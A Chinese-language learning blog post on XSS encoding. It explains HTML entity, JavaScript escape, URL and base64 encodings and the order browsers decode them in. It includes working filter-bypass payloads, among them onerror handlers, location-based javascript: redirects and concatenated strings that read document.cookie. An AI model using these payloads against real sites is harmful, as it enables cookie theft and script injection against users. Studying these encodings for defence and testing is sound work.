Title: xss基础编码
Category: Learning
Date: 2017-3-2
slug: xss-encode-decode

html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。

```
Fun fact Decoding Order:
1. HTML Decoding
2. URL Decoding
3. Javascript Decoding

http://slides.com/mscasharjaved/deck-13#/169
```

三种编码，对于html来说是(10进制和16进制）

###html尖括号
* 十进制：`&#60;` 
* html十六: `&#x3c;`

###javascript的八进制和16进制以及unicode编码:
尖括号－－> 

* 八进制:`\74` 
* 十六进制: `\x3c`
* unicode编码: `\u003c`

###url编码及base64编码(<)

* url: %3C 
* base64: PA==


###html实体编码本身存在的意义是防止与HTML本身语义标记的冲突：

举个例子：

```
&lt;script&gt;alert(1)&lt;/script&gt;
<script>alert(66)</script>
```
上面保存未html文档之后，用浏览器打开，弹出的是66，查看源代码可以看到两个是一模一样，不同的就是第二个可以执行，第一个只是在页面显示出来。

那么正常网站的需求是这样的：

用户输入-->filter-->浏览器显示

如果filter不能很好的处理转义标签，最终展现的页面就可能会执行用户输入的有害代码。呐，这就是xss

壮士，我们来瞅瞅如下个链接可以得出什么结果：

* http://wooyun.jozxing.cc/static/drops/tips-689.html
* https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html
* http://wooyun.jozxing.cc/static/drops/papers-894.html
* https://www.leavesongs.com/PENETRATION/xss-collect.html

html编码和js编码不可以到处乱用，到处乱用也可以，但是要遵守规则：
比如：
`<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">`

上面这一坨可以弹，这是html实体编码，为毛不可以js编码呢，因为他在html标签里面啊。

你说你非要用js，OK，用P神里面的文章可以额这样来实现：
`
<img src="1" onerror=location="javascript:alert%281%29">`

利用location变形,就可以在后面使用js编码咯：

`<img src="1" onerror=location="javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0036\u0036\u0036\u0022\u0029">`

###只有在js中才可以拼接字符串

```
 Wrong:
 <img/src='x'onerror='al'+'er'+'t(1)'>
 right:
 <img/src='x'onerror=location="javascr"+"ipt:al"+"ert%28docu"+"ment.co"+"okie%29">
 
```

上面的是利用location来变形xss，现在来瞅瞅如下的代码:

```
<a href="javascript:alert(1)">this is alert(1)</a>
<a href="javascript:&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#50;&#51;&#41;&#10;">this is html encode</a>
<a href="javascript:%61%6c%65%72%74%28%32%32%29">abc</a>
<img src="1" onerror=location="javascr"+"ipt:al"+"ert%28docu"+"ment.co"+"okie%29">

```
* 第二个和第四个都用到了url encode，貌似在html标签和js里面都能使用URL encodeing
* 其中第四个里面转换为location，location可以加载javascript伪协议，所以这里可以写js编码转换。

最后我门来欣赏下各路风骚的payload:
http://wooyun.jozxing.cc/static/drops/papers-894.html
如果链接失效了，请搜索xss 比赛write up第一期










